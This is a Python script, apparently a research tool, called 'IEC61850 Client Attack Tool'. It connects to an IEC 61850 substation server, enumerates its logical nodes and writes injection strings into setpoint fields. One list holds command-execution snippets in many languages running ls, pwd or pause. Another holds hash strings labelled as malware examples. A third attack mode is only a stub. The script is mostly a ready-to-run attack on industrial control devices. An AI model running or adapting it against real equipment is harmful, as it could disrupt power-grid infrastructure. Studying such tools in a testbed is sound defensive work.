#!/usr/bin/python
"""
IEC61850 Client Attack Tool

usage: 
    attack_client.py [-h] [--port PORT] [--ip IP] 

optional arguments:
    -h, --help            show this help message and exit
    --port <PORT>, -p <PORT>  IEC61850 Server Port Number
    --ip <IP>, -i <IP>        IEC61850 Server IP Address
    --attack <#>, -a <#>      IEC61850 Attack Types (Range 1-3)
    --itterations<#>, -it <#> IEC61850 Attack Itterations

Attack types:
    1 - Command Injection
    2 - Malware Injection
    3 - MMS Header Manipulation

"""

import sys,time,threading,traceback,signal,sys,argparse
sys.path.insert(0, "libiec61850/pyiec61850")
import iec61850
from datetime import datetime
from re import search

def signal_handler(signal, frame):
    print('You pressed Ctrl+C!')

def parser():
    parser = argparse.ArgumentParser(description='IEC61850 Client Attack Tool')
    parser.add_argument('--ip', '-i', action="store", default="localhost",required=True, help='IEC61850 Server IP Address')
    parser.add_argument('--port', '-p', action="store", type=int, default=102,required=True, help='IEC61850 Server Port Number')
    parser.add_argument('--attack', '-a', action="store", type=int, default="",required=True,choices=range(1,4), help='IEC61850 Attack Types (Range 1-3)')
    parser.add_argument('--itterations', '-it', action="store", type=int, default="1",choices=range(1,11), help='IEC61850 Attack Itterations')
    args = parser.parse_args()

    port = args.port
    host = args.ip
    attack = args.attack
    it= args.itterations
    return host,port,attack,it

def main(host,port,attack,it,con):
    
    attack12 =[]
    visable_string_type =['$NamPlt','$NamPlt$d','$NamPlt$IdNs','$NamPlt$swRev','$NamPlt$vendor','LogRef','DatSet','RptID']
    attack3 =[]
    commands= [
        'return execl (\"/bin/pwd\", \"pwd\", NULL);',
        'system((\"/bin/pwd\", \"pwd\", NULL);',
        'popen((\"/bin/pwd\", \"pwd\", NULL);',
        'fp = popen(\"/bin/ls /etc/\", \"r\");printf(\'%s\',fp);',
        'fp = system(\'ls\');printf(\'%s\',fp);',
        'sshell ss; ss.argv.insert(\"ls\");o_(ss.link);',
        'CALL \"SYSTEM\" USING BY CONTENT \"ls\"',
        'Run(@ComSpec & \" /c \" & \'pause\', \"\", @SW_HIDE)',
        'system(\"pause\");',
        'execute_process(COMMAND ls)',
        'spawn,\"ls\",result',
        'System runCommand(\"ls\") stdout println',
        'var sh = new ActiveXObject(\"WScript.Sh\");sh.run(\"/c ls\");',
        '\"ls\" system.',
        'run(\`ls\`)',
        'r: 4:\"ls\"',
        '> (io:format (os:cmd \"ls -alrt\"))',
        'drive1$ = left$(Drives$,1) run \"ls /\";drive1$;\"', 
        'print first butfirst shell [ls -a]   ; ..',
        'contents=$(shell cat foo) curdir=\`pwd\`']
        #https://rosettacode.org/wiki/Execute_a_system_command 
        

    malware_examples=[
        '414af3620d0843f07318a2a33f65667d',
        '0c8b4b357d4f059177ee752a2a3230a5',
        'f16ea91bb744e4abf5b0424e2a7d9246',
        '902d64217c8a0968a7b24af3001abba5',
        'e19167569032677bb8b8a8ce78af11f8',
        'a787ba60426e50c77ac8cb0598b634af',
        'b6c26bbaefdbabedfd71b537b1cd7586',
        'cbf48f823c965b40b3cb1c31c9c51bf6',
        '465c25e393f2e15e337ce5ef817c839e',
        '7209054e29ea7ebfe0828b11609f0db0',
        '9f0bf21fd75f540dce7fc29da799cbe1',
        'f4ecba48d00f3e86b7ff72bfccc03410',
        '417f692bf04685b1e282f2ea8d8933bb',
        '16ee94648fdb34280c838e522292070f',
        'fe59c96c664cf49a857469fa4a37f646',
        '5fb781ff11297732851186f3f7ac4b6a',
        'bf134af3a00189da424657a382913da5',
        '75b50a3fae06f054cf3f28d80cfa4e15',
        '71db409e39688340d0dffff94a012e2e',
        '3b3eaf98db1df32147aadccf66826025',
        '0199d9d68ec0af5819d6137feb04310e']


    #Create Client Connection
    con = iec61850.IedConnection_create()
    error = iec61850.IedConnection_connect(con, host,port);
    
    if (error == iec61850.IED_ERROR_OK):
        [deviceList, error] = iec61850.IedConnection_getLogicalDeviceList(con)
        device = iec61850.LinkedList_getNext(deviceList)
        
        print("Connected to Server.\n")
        
		#Show Logical Node, Logical Device and Data Object inside the Server
        while device:
            logical_device=iec61850.toCharP(device.data)
            print("Name of Logical Device: %s" % logical_device)
            [logicalNodes, error] = iec61850.IedConnection_getLogicalDeviceDirectory(con, logical_device)
            logicalNode = iec61850.LinkedList_getNext(logicalNodes)

            while logicalNode:
                LN_name=iec61850.toCharP(logicalNode.data)
                #print(" LN: %s" % LN_name)
                [LNobjects, error] = iec61850.IedConnection_getLogicalNodeVariables(con, logical_device+"/"+LN_name)
                LNobject = iec61850.LinkedList_getNext(LNobjects)

                while LNobject:
                    #print("  DO: %s" % iec61850.toCharP(LNobject.data))
                    LNobject = iec61850.LinkedList_getNext(LNobject)

                    try:
			#Attack1 and Attack2
                        if attack == 1 or attack == 2:
                            for i in visable_string_type:
                                if(str(iec61850.toCharP(LNobject.data)).endswith(i)):
                                    attack12.append(str(iec61850.toCharP(LNobject.data)))
                                    print(str(iec61850.toCharP(LNobject.data)))
			#Attack3
                        if attack == 3:
                            if str(iec61850.toCharP(LNobject.data)).endswith('$Oper$ctlVal'):
                                attack3.append(str(iec61850.toCharP(LNobject.data)))
                                print(str(iec61850.toCharP(LNobject.data)))

                    except (TypeError, AttributeError):
                        pass
											  


                iec61850.LinkedList_destroy(LNobjects)
                logicalNode = iec61850.LinkedList_getNext(logicalNode)

            iec61850.LinkedList_destroy(logicalNodes)
            device = iec61850.LinkedList_getNext(device)

        iec61850.LinkedList_destroy(deviceList)
        
        running = 1;
    
        signal.signal(signal.SIGINT, signal_handler);

        sp=[]
        ps_r=[]
        sp_w =[]

        while running:

            if attack == 1:
                count = 0
                while count < it:
                    count+=1
                    k = 0
                    for item in attack12:            
                        lln_param = logical_device+"/"+item
                        type = iec61850.IEC61850_FC_SP #Function Code - Setpoint
                        for c in commands:
                            sp_w = iec61850.IedConnection_writeVisibleStringValue(con, lln_param, type, c)
                            print(k,"- Working:",lln_param,c) 		
                            time.sleep(0.1)
                            k+=1

                print("Finished Example Attack 1 - Command Injection")
                print("Attacked parameters:\n", attack12)
                break

            if attack == 2:
                count = 0
                while count < it:
                    count+=1
                    k = 0
                    for item in attack12:            
                        lln_param = logical_device+"/"+item
                        type = iec61850.IEC61850_FC_SP #Function Code - Setpoint
                        for m in malware_examples:
                            sp_w = iec61850.IedConnection_writeVisibleStringValue(con, lln_param, type, m)
                            print(k,"- Working:",lln_param,m) 		
                            time.sleep(0.1)
                            k+=1

                print("Finished Example Attack 2 - Malware Injection")
                print("Attacked parameters:\n", attack12)
                break


            #MMS Structure
            if attack == 3:

                print("attack 3 ................")
                print(attack3)
                break

if __name__=="__main__":
    now = datetime.now();
    current_time = now.strftime("%H:%M:%S");
    print("Starting at Time %s" % current_time);
    con = iec61850.IedConnection_create()
    host,port,attack,it = parser()
    main(host,port,attack,it,con)
    
    iec61850.IedConnection_close(con)
    iec61850.IedConnection_destroy(con)
    print("\n Client Disconnected.")




